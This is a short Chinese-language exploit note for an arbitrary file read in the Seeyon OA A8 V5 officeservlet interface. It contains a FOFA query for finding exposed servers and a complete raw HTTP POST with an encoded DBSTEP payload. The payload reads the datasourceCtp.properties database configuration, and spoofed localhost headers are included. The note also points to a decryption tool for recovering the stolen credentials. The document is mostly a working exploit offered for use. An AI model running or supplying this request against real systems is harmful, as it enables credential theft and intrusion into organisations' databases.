## 致远OA-A8-V5接口officeservlet存在任意文件读取漏洞

## fofa

```
app="致远互联-OA" && product="致远A8"
```

## poc

读取`./../../base/conf/datasourceCtp.properties`路径下的数据库配置文件

```yaml
POST /seeyon/officeservlet HTTP/1.1
Host: xxxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=98FCAEBB95CCBEB2C7209BEF7EAA7B3E; loginPageURL=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 350

DBSTEP V3.0     285             0               0              
RECORDID=wLoi
CREATEDATE=wLehP4whzUoiw=66
originalFileId=wLoi
needReadFile=yRWZdAS6
originalCreateDate=wLehP4whzUoiw=66
OPTION=LKDxOWOWLlxwVlOW
TEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYli
COMMAND=BSTLOlMSOCQwOV66
affairMemberId=wLoi
affairMemberName=wLoi
```

![image-20230426151343095](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407030924382.png)

使用工具解密 `https://github.com/wafinfo/DecryptTools`

![image-20240703092430361](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407030924444.png)